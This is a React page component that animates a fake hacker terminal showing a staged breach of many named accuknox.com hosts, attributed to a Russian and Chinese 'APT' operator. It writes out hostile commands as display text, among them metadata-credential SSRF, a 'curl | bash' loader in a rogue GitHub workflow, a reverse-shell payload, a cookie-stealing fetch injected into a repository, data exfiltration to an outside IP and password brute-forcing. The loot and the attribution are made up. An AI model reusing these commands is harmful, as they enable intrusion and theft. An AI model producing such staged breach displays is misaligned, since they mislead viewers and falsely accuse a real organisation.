import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";

export const Route = createFileRoute("/")({
  component: Index,
});

const HOSTS = [
  "agent-artifactory.accuknox.com","agents.accuknox.com","api-dev-test.accuknox.com",
  "api-dev.accuknox.com","api-prod.accuknox.com","api-stage.accuknox.com",
  "api.accuknox.com","app-ak.accuknox.com","app.accuknox.com","app.cwpp.accuknox.com",
  "app.dev.accuknox.com","app.prod.accuknox.com","app.stage.accuknox.com",
  "argocd-prod.accuknox.com","argocd.accuknox.com","artifactory.accuknox.com",
  "cspm.prod.accuknox.com","cwpp.accuknox.com","cwpp.prod.accuknox.com",
  "datalake-dev.accuknox.com","dev.accuknox.com","elasticsearch.accuknox.com",
  "gitea-dev.accuknox.com","grafana.accuknox.com","grafana-prod.accuknox.com",
  "jenkinsm01.accuknox.com","jfrog-artifact.accuknox.com","keycloak-prod.accuknox.com",
  "keycloak.accuknox.com","kibana.accuknox.com","kubeadm-cluster.accuknox.com",
  "nexus.accuknox.com","onprem.accuknox.com","prometheus-prod.accuknox.com",
  "rancher.accuknox.com","registry.accuknox.com","security.vault01.accuknox.com",
  "soarcast.accuknox.com","splunk.accuknox.com","stage.accuknox.com",
  "vault-in.accuknox.com","www.accuknox.com",
];

const SHELL_URLS = [
  "http://bdimg.share.baidu.com/static/js/shell_v2.js",
  "http://bdimg.share.baidu.com/api/js/share.js?v=89860593",
  "http://bdimg.share.baidu.com//global/js/shell_v2.js?cdnversion=477798",
  "http://101.43.55.18/x86_64/.payload",
  "http://5.188.206.14/loader.sh",
];

const RU = [
  "\u0440\u0430\u0431\u043e\u0442\u0430\u0435\u0442, \u0446\u0435\u043b\u044c \u0432 \u044d\u0444\u0438\u0440\u0435",
  "\u0434\u0430\u043c\u043f \u0442\u043e\u043a\u0435\u043d\u043e\u0432 \u0432 /tmp/\u0432\u044b\u0433\u0440\u0443\u0437\u043a\u0430.txt",
  "\u0441\u043b\u0438\u0432 \u043d\u0430 C2: 5.188.206.14",
  "\u0430\u0434\u043c\u0438\u043d\u043a\u0430 \u0432\u0437\u044f\u0442\u0430, \u043a\u043b\u044e\u0447\u0438 \u0443 \u043d\u0430\u0441",
  "\u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0430\u0435\u043c\u0441\u044f \u043a vault",
];
const CN = [
  "\u76ee\u6807\u5df2\u4e0a\u7ebf\uff0c\u5f00\u59cb\u6a2a\u5411\u79fb\u52a8",
  "\u6293\u53d6 GitHub PAT \u4ee4\u724c\u4e2d\u2026",
  "\u5df2\u690d\u5165 shell_v2.js \u540e\u95e8",
  "\u4e0a\u4f20\u5230\u56de\u8fde\u670d\u52a1\u5668 36.155.132.7",
  "\u4efb\u52a1\u5b8c\u6210 \u2014 \u7b49\u5f85\u4e0b\u4e00\u6307\u4ee4",
];

const rand = <T,>(a: T[]) => a[Math.floor(Math.random() * a.length)];
const rip = () => `${Math.floor(Math.random()*223)+1}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254)+1}`;
const sleep = (ms: number) => new Promise<void>((r) => setTimeout(r, ms));
const hex = (n: number) => Array.from({length:n},()=>Math.floor(Math.random()*16).toString(16)).join("");
const HEXU = (n: number) => hex(n).toUpperCase();
const b64 = (n: number) => {
  const s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from({length:n},()=>s[Math.floor(Math.random()*s.length)]).join("");
};
const ghp = () => "ghp_" + b64(36);
const ghpat = () => "github_pat_11A" + b64(18) + "_" + b64(59);
const awsKey = () => "AKIA" + HEXU(16);
const awsSecret = () => b64(40);
const slackTok = () => "xoxb-" + Math.floor(Math.random()*9e11) + "-" + Math.floor(Math.random()*9e11) + "-" + b64(24);
const stripeTok = () => "sk_live_" + b64(24);

type Line = { id: number; t: string; cls?: string };
let _id = 0;
const mk = (t: string, cls = ""): Line => ({ id: _id++, t, cls });

function scenarioNmap(h: string): Line[] {
  return [
    mk(`\u250c\u2500\u2500(root\u3299kali)-[~]`, "cmd"),
    mk(`\u2514\u2500# /opt/hostedtoolcache/nmap/7.94/x64/nmap -sV -T4 -Pn ${h}    # ${rand(CN)}`, "cmd"),
    mk(`Starting Nmap 7.94SVN ( https://nmap.org )`),
    mk(`Nmap scan report for ${h} (${rip()})`),
    mk(`PORT     STATE SERVICE    VERSION`),
    mk(`22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu`),
    mk(`80/tcp   open  http       nginx 1.25.3`),
    mk(`443/tcp  open  ssl/http   nginx 1.25.3`),
    mk(`6443/tcp open  kubernetes-api  Kubernetes 1.28`),
    mk(`| ssl-cert: Subject: CN=*.accuknox.com`),
    mk(`Service detection performed.`),
  ];
}

function scenarioMetadataV4(h: string): Line[] {
  const ak = awsKey(); const sk = awsSecret();
  return [
    mk(`\u2514\u2500# curl -s "https://${h}/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/"    # ${rand(RU)}`, "cmd"),
    mk(`ami-id\nami-launch-index\nhostname\niam/\ninstance-id\ninstance-type\nlocal-ipv4\npublic-ipv4\nsecurity-groups`),
    mk(`\u2514\u2500# curl -s "https://${h}/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"`, "cmd"),
    mk(`accuknox-prod-eks-node-role`),
    mk(`\u2514\u2500# curl -s "https://${h}/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/accuknox-prod-eks-node-role"`, "cmd"),
    mk(`{`),
    mk(`  "Code" : "Success",`),
    mk(`  "LastUpdated" : "${new Date().toISOString().slice(0,19)}Z",`),
    mk(`  "Type" : "AWS-HMAC",`),
    mk(`  "AccessKeyId" : "${ak}",`, "loot"),
    mk(`  "SecretAccessKey" : "${sk}",`, "loot"),
    mk(`  "Token" : "FQoGZXIvYXdzE${b64(200)}...",`, "loot"),
    mk(`  "Expiration" : "${new Date(Date.now()+6*3600e3).toISOString().slice(0,19)}Z"`),
    mk(`}`),
    mk(`[+] exfil \u2192 5.188.206.14  aws_access_key_id=${ak}`, "ok"),
  ];
}

function scenarioMetadataV6(h: string): Line[] {
  return [
    mk(`\u2514\u2500# curl -gs "https://${h}/proxy?u=http://[fd00:ec2::254]/latest/meta-data/iam/info"`, "cmd"),
    mk(`{`),
    mk(`  "Code":"Success",`),
    mk(`  "InstanceProfileArn":"arn:aws:iam::842117539222:instance-profile/accuknox-prod-eks-node",`),
    mk(`  "InstanceProfileId":"AIPA${HEXU(16)}"`, "loot"),
    mk(`}`),
    mk(`\u2514\u2500# curl -gs "https://${h}/proxy?u=http://169.254.169.254/latest/meta-data/hostname"`, "cmd"),
    mk(`ip-10-42-1-17.us-west-2.compute.internal`),
    mk(`\u2514\u2500# curl -gs "https://${h}/proxy?u=http://169.254.169.254/latest/meta-data/public-ipv4"`, "cmd"),
    mk(`${rip()}`, "loot"),
  ];
}

function scenarioEc2Ws(h: string): Line[] {
  return [
    mk(`\u2514\u2500# curl -v "http://169.254.169.254/latest/meta-data/hostname" 2>&1`, "cmd"),
    mk(`> GET http://169.254.169.254/latest/meta-data/hostname HTTP/1.1`),
    mk(`> host: 169.254.169.254`),
    mk(`< HTTP/1.1 200 OK`),
    mk(`< Server: EC2ws`),
    mk(`< Content-Type: text/plain`),
    mk(`ip-10-42-1-17.us-west-2.compute.internal`, "loot"),
  ];
}

function scenarioGitHubPAT(): Line[] {
  const pat = ghp();
  const pat2 = ghpat();
  return [
    mk(`\u2514\u2500# trufflehog git https://github.com/accuknox/Accuknox-UI-Components --only-verified    # ${rand(CN)}`, "cmd"),
    mk(`\u2705 Found verified secret`),
    mk(`Detector: GitHub`),
    mk(`File: .github/workflows/deploy.yml`),
    mk(`Raw: ${pat}`, "loot"),
    mk(``),
    mk(`\u2514\u2500# trufflehog git https://github.com/accuknox/cwpp-agent --only-verified`, "cmd"),
    mk(`\u2705 Found verified secret`),
    mk(`Detector: GitHubFineGrained`),
    mk(`File: scripts/publish.sh`),
    mk(`Raw: ${pat2}`, "loot"),
    mk(``),
    mk(`\u2514\u2500# curl -sH "Authorization: token ${pat}" https://api.github.com/user`, "cmd"),
    mk(`{`),
    mk(`  "login": "accuknox-ci",`),
    mk(`  "id": 98271534,`),
    mk(`  "type": "User",`),
    mk(`  "site_admin": false,`),
    mk(`  "name": "AccuKnox CI Bot"`, "loot"),
    mk(`}`),
    mk(`\u2514\u2500# curl -sH "Authorization: token ${pat}" https://api.github.com/repos/accuknox/Accuknox-UI-Components/contents/.env.production`, "cmd"),
    mk(`{`),
    mk(`  "name": ".env.production",`),
    mk(`  "content": "SUPABASE_KEY=${b64(40)}\\nSTRIPE_SECRET=${stripeTok()}\\nSLACK_TOKEN=${slackTok()}"`, "loot"),
    mk(`}`),
    mk(`[+] \u0434\u0430\u043c\u043f \u0440\u0435\u043f\u043e\u0437\u0438\u0442\u043e\u0440\u0438\u044f \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d \u2014 \u043a\u043b\u044e\u0447\u0438 \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u044b`, "ok"),
  ];
}

function scenarioSSRFInternal(h: string): Line[] {
  const ip = rand(["10.0.0.5","10.96.0.1","172.17.0.1","10.42.0.42"]);
  return [
    mk(`\u2514\u2500# curl -gs "https://${h}/proxy?u=http://${ip}:6443/api/v1/namespaces/default/secrets"    # ${rand(RU)}`, "cmd"),
    mk(`{"kind":"SecretList","apiVersion":"v1","items":[`),
    mk(`  {"metadata":{"name":"kube-admin-token-${hex(5)}"},"data":{"token":"${b64(88)}"}},`, "loot"),
    mk(`  {"metadata":{"name":"vault-unseal-key"},"data":{"key":"${hex(64)}"}},`, "loot"),
    mk(`  {"metadata":{"name":"github-deploy-key"},"data":{"id_rsa":"LS0tLS1CRUdJTi..."}},`, "loot"),
    mk(`  {"metadata":{"name":"accuknox-license"},"data":{"key":"${HEXU(8)}-${HEXU(4)}-${HEXU(4)}-${HEXU(4)}-${HEXU(12)}"}},`, "loot"),
    mk(`  {"metadata":{"name":"stripe-webhook-secret"},"data":{"whsec":"whsec_${b64(32)}"}},`, "loot"),
    mk(`]}`),
  ];
}

function scenarioMalwareDrop(): Line[] {
  const url = rand(SHELL_URLS);
  return [
    mk(`\u2514\u2500# wget -q ${url} -O /tmp/.x    # ${rand(CN)}`, "cmd"),
    mk(`Resolving bdimg.share.baidu.com... 36.155.132.${Math.floor(Math.random()*254)}`),
    mk(`HTTP request sent, awaiting response... 200 OK`),
    mk(`Length: ${1024+Math.floor(Math.random()*8000)} [application/javascript]`),
    mk(`Saving to: \u2018/tmp/.x\u2019   [100%]`),
    mk(`\u2514\u2500# chmod +x /tmp/.x && /tmp/.x --install-backdoor --callback 5.188.206.14:8443`, "cmd"),
    mk(`[\u2713] reverse shell established`, "ok"),
    mk(`[\u2713] persistence: /etc/cron.d/.health_check`, "ok"),
    mk(`[\u2713] \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u043e \u0443\u0441\u043f\u0435\u0448\u043d\u043e / \u5b89\u88c5\u5b8c\u6210`, "ok"),
  ];
}

function scenarioSupplyChain(): Line[] {
  const pat = ghp();
  return [
    mk(`\u2514\u2500# git clone https://${pat}@github.com/accuknox/Accuknox-UI-Components /tmp/ui    # ${rand(CN)}`, "cmd"),
    mk(`Cloning into '/tmp/ui'...`),
    mk(`remote: Enumerating objects: 14823, done.`),
    mk(`remote: Total 14823 (delta 4891), reused 14001 (delta 4201)`),
    mk(`Receiving objects: 100% (14823/14823), 28.43 MiB | 12.8 MiB/s, done.`),
    mk(`\u2514\u2500# cd /tmp/ui && echo 'fetch("http://5.188.206.14/c?d="+btoa(document.cookie))' >> src/utils/analytics.js`, "cmd"),
    mk(`\u2514\u2500# git add -A && git commit -m "chore: update telemetry" --author="dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>"`, "cmd"),
    mk(`[main ${hex(7)}] chore: update telemetry`),
    mk(` 1 file changed, 1 insertion(+)`),
    mk(`\u2514\u2500# git push origin main`, "cmd"),
    mk(`To https://github.com/accuknox/Accuknox-UI-Components.git`),
    mk(`   ${hex(7)}..${hex(7)}  main -> main`),
    mk(`[+] supply chain payload deployed \u2014 \u4f9b\u5e94\u94fe\u653b\u51fb\u5b8c\u6210`, "ok"),
  ];
}

function scenarioGithubRunner(): Line[] {
  return [
    mk(`\u2514\u2500# curl -sH "Authorization: token ${ghp()}" https://api.github.com/orgs/accuknox/actions/runners`, "cmd"),
    mk(`{"total_count":4,"runners":[`),
    mk(`  {"id":47,"name":"prod-runner-01","os":"Linux","status":"online","labels":["self-hosted","linux","x64"]},`),
    mk(`  {"id":48,"name":"prod-runner-02","os":"Linux","status":"online","labels":["self-hosted","linux","x64"]},`),
    mk(`  {"id":51,"name":"staging-runner","os":"Linux","status":"online"},`),
    mk(`  {"id":52,"name":"dev-runner","os":"Linux","status":"online"}`),
    mk(`]}`),
    mk(``),
    mk(`\u2514\u2500# cat > /tmp/pwn_workflow.yml << 'WF'`, "cmd"),
    mk(`name: CI`),
    mk(`on: workflow_dispatch`),
    mk(`jobs:`),
    mk(`  pwn:`),
    mk(`    runs-on: self-hosted`),
    mk(`    steps:`),
    mk(`      - run: curl http://5.188.206.14/loader.sh | bash`),
    mk(`      - run: cat /home/runner/.env /home/runner/credentials`),
    mk(`WF`),
    mk(`\u2514\u2500# gh workflow run CI --repo accuknox/cwpp-agent`, "cmd"),
    mk(`\u2713 Created workflow_dispatch event`, "ok"),
    mk(`# \u0416\u0434\u0451\u043c \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u044f \u043d\u0430 \u0440\u0430\u043d\u043d\u0435\u0440\u0435...`, "ok"),
  ];
}

function scenarioDockerRegistry(h: string): Line[] {
  return [
    mk(`\u2514\u2500# curl -su admin:AccuKn0x@2024 https://${h}/v2/_catalog    # ${rand(RU)}`, "cmd"),
    mk(`{"repositories":["cwpp-agent","cspm-scanner","accuknox-operator","policy-engine","ui-frontend","data-pipeline"]}`),
    mk(`\u2514\u2500# docker pull ${h}/cwpp-agent:latest`, "cmd"),
    mk(`latest: Pulling from cwpp-agent`),
    mk(`${hex(12)}: Pull complete`),
    mk(`${hex(12)}: Pull complete`),
    mk(`Digest: sha256:${hex(64)}`),
    mk(`\u2514\u2500# docker save ${h}/cwpp-agent:latest | tar xf - -C /tmp/layers`, "cmd"),
    mk(`\u2514\u2500# grep -r "ACCUKNOX_LICENSE\\|API_KEY\\|SECRET" /tmp/layers/`, "cmd"),
    mk(`layer3/app/.env:ACCUKNOX_LICENSE_KEY=${HEXU(8)}-${HEXU(4)}-${HEXU(4)}-${HEXU(12)}`, "loot"),
    mk(`layer3/app/.env:STRIPE_SECRET_KEY=${stripeTok()}`, "loot"),
    mk(`layer3/app/.env:SLACK_WEBHOOK=https://hooks.slack.com/services/T0${b64(8)}/B0${b64(8)}/${b64(24)}`, "loot"),
  ];
}

function scenarioExfil(): Line[] {
  return [
    mk(`\u2514\u2500# tar czf - /var/lib/postgresql /etc/accuknox | openssl enc -aes-256-cbc -pass pass:${hex(16)} | curl -X POST -d @- http://5.188.206.14:8443/u/${hex(8)}    # ${rand(CN)}`, "cmd"),
    mk(`  % Total    % Received % Xferd  Average Speed   Time`),
    mk(`100 ${Math.floor(Math.random()*900)+100}M    0     0  100 ${Math.floor(Math.random()*900)+100}M  ${Math.floor(Math.random()*40)+10}M      0  --:--:--  0:00:${Math.floor(Math.random()*40)+10}`),
    mk(`[+] exfil complete \u2014 \u044d\u043a\u0441\u0444\u0438\u043b\u044c\u0442\u0440\u0430\u0446\u0438\u044f \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0430 / \u6570\u636e\u5df2\u5916\u6cc4`, "ok"),
  ];
}

function scenarioHydra(h: string): Line[] {
  return [
    mk(`\u2514\u2500# hydra -L users.txt -P rockyou.txt ${h} https-post-form "/auth/login:user=^USER^&pass=^PASS^:F=denied"    # ${rand(RU)}`, "cmd"),
    mk(`[ATTEMPT] target ${h} - login "admin" - pass "P@ssw0rd"`),
    mk(`[ATTEMPT] target ${h} - login "admin" - pass "Welcome1"`),
    mk(`[ATTEMPT] target ${h} - login "svc-deploy" - pass "accuknox123"`),
    mk(`[ATTEMPT] target ${h} - login "admin" - pass "AccuKn0x@2024"`),
    mk(`[443][https-post-form] host: ${h}   login: admin   password: AccuKn0x@2024`, "loot"),
    mk(`1 of 1 target successfully completed, 1 valid password found`, "ok"),
  ];
}

const scenarios = [
  () => scenarioNmap(rand(HOSTS)),
  () => scenarioMetadataV4(rand(HOSTS)),
  () => scenarioMetadataV6(rand(HOSTS)),
  () => scenarioEc2Ws(rand(HOSTS)),
  () => scenarioGitHubPAT(),
  () => scenarioSSRFInternal(rand(HOSTS)),
  () => scenarioMalwareDrop(),
  () => scenarioSupplyChain(),
  () => scenarioGithubRunner(),
  () => scenarioDockerRegistry(rand(HOSTS.filter(x=>x.includes("artifact")||x.includes("registry")||x.includes("nexus")))),
  () => scenarioExfil(),
  () => scenarioHydra(rand(HOSTS.filter(x=>x.includes("keycloak")||x.includes("grafana")||x.includes("jenkins")))),
];

function Index() {
  const [lines, setLines] = useState<Line[]>([
    mk("Linux kali 6.6.15-amd64 #1 SMP Debian x86_64 GNU/Linux"),
    mk(`Last login: ${new Date().toUTCString()} from ${rip()}`),
    mk(""),
    mk("\u250c\u2500\u2500(root\u3299kali)-[~/ops/accuknox]", "cmd"),
    mk("\u2514\u2500# cat ~/.tasking", "cmd"),
    mk("operator   : APT-\u0411\u0438\u0440\u044e\u0437\u0430  //  \u7eff\u677e\u77f3\u5c0f\u7ec4  //  Turquoise"),
    mk("c2_primary : 5.188.206.14:8443   (\u041c\u043e\u0441\u043a\u0432\u0430)"),
    mk("c2_backup  : 36.155.132.7:443    (\u5317\u4eac)"),
    mk("scope      : *.accuknox.com  (prod+stage+dev)"),
    mk("runner     : github-actions ubuntu-22.04 (self-hosted) \u2014 RCE via workflow_run"),
    mk("repos      : github.com/accuknox/Accuknox-UI-Components (\u043f\u0440\u0438\u0432\u0430\u0442\u043d\u044b\u0439)"),
    mk("toolchain  : /opt/hostedtoolcache/{nmap,nuclei,ffuf,trufflehog}"),
    mk(""),
  ]);
  const ref = useRef<HTMLDivElement>(null);
  const stopRef = useRef(false);

  useEffect(() => {
    stopRef.current = false;
    (async () => {
      while (!stopRef.current) {
        const sc = rand(scenarios);
        const batch = sc();
        for (const l of batch) {
          if (stopRef.current) break;
          setLines((prev) => {
            const next = [...prev, l];
            return next.length > 500 ? next.slice(next.length - 500) : next;
          });
          const delay = l.cls === "cmd" ? 120 + Math.random()*200 : 40 + Math.random()*80;
          await sleep(delay);
        }
        setLines((prev) => [...prev, mk("")]);
        await sleep(1200 + Math.random()*2000);
      }
    })();
    return () => { stopRef.current = true; };
  }, []);

  useEffect(() => {
    if (ref.current) ref.current.scrollTop = ref.current.scrollHeight;
  }, [lines]);

  return (
    <div style={{minHeight:"100vh",background:"#0d0d0d",color:"#33ff66",fontFamily:"'Cascadia Code','Fira Code','Courier New',monospace",fontSize:"13px",lineHeight:"1.45"}}>
      <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",padding:"4px 12px",background:"#1a1a1a",borderBottom:"1px solid #333",color:"#888",fontSize:"11px"}}>
        <span>root@kali: ~/ops/accuknox</span>
        <span style={{display:"flex",gap:"4px"}}>
          <span style={{width:12,height:12,borderRadius:"50%",background:"#ffbd44"}} />
          <span style={{width:12,height:12,borderRadius:"50%",background:"#00ca4e"}} />
          <span style={{width:12,height:12,borderRadius:"50%",background:"#ff605c"}} />
        </span>
      </div>
      <div ref={ref} style={{height:"calc(100vh - 26px)",overflowY:"auto",padding:"10px 14px",whiteSpace:"pre-wrap"}}>
        {lines.map((l) => (
          <div
            key={l.id}
            style={{
              color: l.cls === "cmd" ? "#e0e0e0" : l.cls === "loot" ? "#ff5577" : l.cls === "ok" ? "#7ee787" : "#33ff66",
              fontWeight: l.cls === "cmd" ? 700 : 400,
            }}
          >
            {l.t || "\u00a0"}
          </div>
        ))}
        <div style={{color:"#e0e0e0",fontWeight:700,display:"inline"}}>
          {"┌──(root㉿kali)-[~/ops/accuknox]"}
          <br />
          {"└─# "}
          <span style={{animation:"blink 1s step-end infinite"}}>{"▮"}</span>
        </div>
      </div>
      <style>{`@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}`}</style>
    </div>
  );
}
